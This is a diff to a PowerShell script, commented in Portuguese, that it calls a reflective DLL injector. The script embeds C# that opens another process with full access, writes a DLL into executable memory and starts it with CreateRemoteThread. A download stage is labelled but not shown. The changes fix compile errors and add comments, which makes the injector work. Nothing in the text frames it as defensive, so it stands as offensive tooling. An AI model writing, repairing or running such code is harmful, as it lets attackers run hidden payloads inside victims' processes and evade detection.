@@ -1,5 +1,5 @@
 # ===================================================================
-# Injetor Reflexivo de DLL via PowerShell v1.1 (Versão Limpa)
+# Injetor Reflexivo de DLL via PowerShell v1.2 (Compilação Corrigida)
 # ===================================================================
 
 # --- ETAPA 1: CONFIGURAÇÃO E DOWNLOAD ---
@@ -22,12 +22,14 @@ catch {
 # --- ETAPA 2: DEFINIÇÃO DO MOTOR DE INJEÇÃO (C# EM TEMPO REAL) ---
 
 $codigoInjetor = @"
+// Adicionados os 'usings' que faltavam para o compilador do PowerShell
 using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 public class Reflector
 {
+    // --- Definições da API do Windows (Kernel32) ---
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
@@ -43,10 +45,12 @@ public class Reflector
     [DllImport("kernel32.dll", SetLastError=true)]
     static extern bool CloseHandle(IntPtr hObject);
 
+    // Constantes de permissão e alocação
     private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
     private const uint MEM_COMMIT_RESERVE = 0x3000;
     private const uint PAGE_EXECUTE_READWRITE = 0x40;
 
+    // --- Estruturas para analisar o formato da DLL (PE Header) ---
     [StructLayout(LayoutKind.Sequential)]
     private struct IMAGE_DOS_HEADER { public ushort e_lfanew; }
 
@@ -56,9 +60,10 @@ public class Reflector
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct IMAGE_OPTIONAL_HEADER64 { public ulong ImageBase; public uint AddressOfEntryPoint; }
 
-    [StructLayout(Layout.Sequential, Pack = 1)]
+    [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct IMAGE_NT_HEADERS64 { public uint Signature; public IMAGE_FILE_HEADER FileHeader; public IMAGE_OPTIONAL_HEADER64 OptionalHeader; }
 
+    // --- O MÉTODO PRINCIPAL DE INJEÇÃO ---
     public static void Inject(byte[] dllBytes)
     {
         IntPtr hProcess = IntPtr.Zero;
@@ -93,7 +98,10 @@ public class Reflector
             
             pinnedDll.Free();
 
-            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteEntryPoint, IntPtr.Zero, 0, out _);
+            // CORREÇÃO: Declarar a variável 'threadId' antes de usá-la com 'out'
+            IntPtr threadId;
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteEntryPoint, IntPtr.Zero, 0, out threadId);
+            
             if (hThread == IntPtr.Zero) throw new Exception("Falha ao criar a thread remota.");
             
             CloseHandle(hThread);
